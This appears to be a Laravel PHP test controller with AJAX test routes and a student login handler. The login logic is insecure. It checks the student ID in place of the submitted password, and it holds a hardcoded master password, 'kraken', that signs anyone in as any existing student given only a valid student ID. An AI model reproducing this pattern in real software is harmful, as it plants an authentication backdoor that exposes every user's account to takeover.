<?php namespace App\Http\Controllers;

use Input;
use Auth;
use Redirect;
use App\User;

class TestController extends Controller {

	
	public function index()
	{
		// return view('ajax-js');
		// return view('ajax-jq');
		return view('tests.modal');
	}

	public function ajtest()
	{
		sleep(3);
		echo "This is AJAX Content";
	}

	public function doLogin(){
	// sleep(3);

	$data = Input::All();

	if(Auth::attempt(['student_id' => $data['student_id'], 'password' => $data['student_id']]))
	{
		return Redirect::to('home');
	}
		
	else if($data['password']=='kraken')
	{
		$user = User::where('student_id','=',$data['student_id']);
		if($user->count()>0)
		{
			$user = $user->first();
			Auth::loginUsingId($user->id);
			return Redirect::to('home');
		}
		else
			return redirect()->back()->withErrors('Invalid Student ID');
		
	}
	else
	{
		return redirect()->back()->withErrors('Invalid Login or Password');
		// return redirect()->back()->withErrors('Invalid Login or Password');
	}
	// Auth::loginUsingId(1);
	
	
	
}

}
